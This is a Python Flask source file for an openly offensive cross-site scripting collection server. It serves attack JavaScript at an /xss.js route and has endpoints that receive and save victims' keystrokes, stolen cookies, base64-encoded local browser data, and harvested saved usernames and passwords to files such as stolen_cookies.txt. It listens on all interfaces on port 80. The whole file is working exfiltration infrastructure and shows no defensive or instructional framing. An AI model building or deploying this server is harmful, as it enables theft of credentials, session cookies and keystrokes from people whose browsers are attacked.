from flask import Flask, request, url_for, send_from_directory
import json
import base64
import re
import netifaces as ni
import os

app = Flask(__name__)


def decode(encodedstring):
    return base64.b64decode(encodedstring).decode('utf-8')

@app.route('/keyloggers')
def get_keys():
    with open('keyslogged.txt', 'a+') as f:
        f.write(request.args['k'])

    return "200"

@app.route('/xss.js')
def alert_js():
    script = request.args['f']
    return send_from_directory('static', f'{script}.js')

@app.route('/cookies')
def grab_cookies():
    cookies = request.args["data"]
    with open('stolen_cookies.txt', 'a+') as f:
        f.write(cookies+"\r\n")
    return "200"

@app.route('/local_data')
def grab_local_data():
    test = request.args['data']
    with open('local_data_gathered.txt', 'a+') as f:
        f.write(decode(test).replace('\\','')+"\r\n")
    #print(decode(test).replace('\\',''))
    return "200"

@app.route('/saved_passwords')
def grab_saved_passwords():
    username = request.args['u']
    password = request.args['p']
    if username == '':
        print("nope")
    elif password == '':
        print("nope")
    else:
        with open('saved_passwords_gathered.txt', 'a+') as f:
            f.write(f'{username}:{password}\r\n')
    return "200"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
